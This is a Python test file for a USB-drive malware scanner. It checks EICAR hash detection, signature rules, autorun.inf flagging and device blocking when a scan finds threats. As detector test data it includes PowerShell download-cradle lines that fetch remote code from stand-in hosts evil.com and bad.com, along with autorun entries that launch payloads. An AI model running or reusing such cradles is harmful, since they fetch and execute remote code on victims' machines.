from pathlib import Path

from usb_analyzer.core.events import DeviceEvent, EventSeverity
from usb_analyzer.policy.engine import PolicyEngine
from usb_analyzer.policy.enforcement import MockDeviceBlocker
from usb_analyzer.policy.models import PolicyMode
from usb_analyzer.policy.store import WhitelistStore
from usb_analyzer.storage_scanner.scanner import scan_path
from usb_analyzer.storage_scanner.service import StorageScanService
from usb_analyzer.storage_scanner.signatures import (
    EICAR_SHA256,
    EICAR_STRING,
    SignatureEngine,
    YaraRule,
)


def test_signature_engine_eicar_hash():
    engine = SignatureEngine()
    threat = engine.check_hash(EICAR_SHA256)
    assert threat is not None
    assert "EICAR" in threat


def test_signature_engine_rules():
    engine = SignatureEngine()

    # 1. EICAR content
    eicar_matches = engine.scan_content(EICAR_STRING)
    rule_names = [m[0] for m in eicar_matches]
    assert "EICAR_Test_File" in rule_names

    # 2. Suspicious autorun
    autorun_content = b"[AutoRun]\r\nopen=setup.exe\r\naction=Run Setup"
    autorun_matches = engine.scan_content(autorun_content, filename="autorun.inf")
    rule_names = [m[0] for m in autorun_matches]
    assert "Suspicious_Autorun_Inf" in rule_names

    # 3. PowerShell download cradle
    ps_content = b"powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://evil.com/x')"
    ps_matches = engine.scan_content(ps_content, filename="script.ps1")
    rule_names = [m[0] for m in ps_matches]
    assert "PowerShell_Download_Cradle" in rule_names

    # 4. Clean content
    clean_matches = engine.scan_content(b"Hello world! This is a benign text file.")
    assert len(clean_matches) == 0


def test_scenario_2_infected_drive_scan(tmp_path: Path):
    # Scenario 2 from proposal:
    # "Infected drive: EICAR test file plus a fake autorun.inf -> High-severity alert"
    test_root = tmp_path / "usb_drive"
    test_root.mkdir()

    # Create custom test signature engine so Defender on Windows doesn't delete the test file mid-test
    mock_malware_hash = "111122223333444455556666777788889999aaaabbbbccccddddeeeeffff0000"
    engine = SignatureEngine(
        known_hashes={mock_malware_hash: "Test Trojan Payload"},
        custom_rules=[
            YaraRule(
                name="Trojan_Test_Sig",
                description="Simulated malware test signature",
                patterns=[b"MALICIOUS_SIMULATION_STRING_V1"],
            )
        ],
    )

    infected_file = test_root / "suspicious_payload.bin"
    infected_file.write_bytes(b"MALICIOUS_SIMULATION_STRING_V1 extra data")

    autorun_file = test_root / "autorun.inf"
    autorun_file.write_text("[AutoRun]\nopen=suspicious_payload.bin\naction=Open Drive")

    clean_file = test_root / "document.txt"
    clean_file.write_text("Legitimate financial document")

    result = scan_path(test_root, signature_engine=engine)

    assert result.has_threats is True
    assert len(result.files) == 3
    assert len(result.flagged) == 2

    flagged_map = {f.path: f for f in result.flagged}
    assert "suspicious_payload.bin" in flagged_map
    assert "autorun.inf" in flagged_map

    sig_flags = flagged_map["suspicious_payload.bin"].flags
    assert any("Trojan_Test_Sig" in f for f in sig_flags)

    autorun_flags = flagged_map["autorun.inf"].flags
    assert "autorun_inf" in autorun_flags
    assert any("yara:Suspicious_Autorun_Inf" in f for f in autorun_flags)


class FakeEventSink:
    def __init__(self):
        self.events: list[DeviceEvent] = []

    def add(self, event: DeviceEvent) -> DeviceEvent:
        self.events.append(event)
        return event


def test_scenario_2_service_critical_alert_and_block(tmp_path: Path):
    test_root = tmp_path / "infected_usb"
    test_root.mkdir()
    (test_root / "script.ps1").write_text("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bad.com')")
    (test_root / "autorun.inf").write_text("[autorun]\nshellexecute=payload.bat")

    sink = FakeEventSink()
    store = WhitelistStore(tmp_path / "test.db")
    blocker = MockDeviceBlocker()
    engine = PolicyEngine(store=store, blocker=blocker, mode=PolicyMode.ENFORCE)

    service = StorageScanService(
        event_sink=sink,
        policy_engine=engine,
        max_workers=1,
    )

    device_id = "USBSTOR\\DISK&VEN_INFECTED&PROD_DRIVE\\0014D9999999&0"
    service._scan(device_id, str(test_root))

    event_types = [e.event_type for e in sink.events]
    assert "scan.completed" in event_types
    assert "device.blocked" in event_types

    scan_event = next(e for e in sink.events if e.event_type == "scan.completed")
    assert scan_event.severity == EventSeverity.CRITICAL
    assert scan_event.details["has_threats"] is True
    assert device_id in blocker.blocked_devices
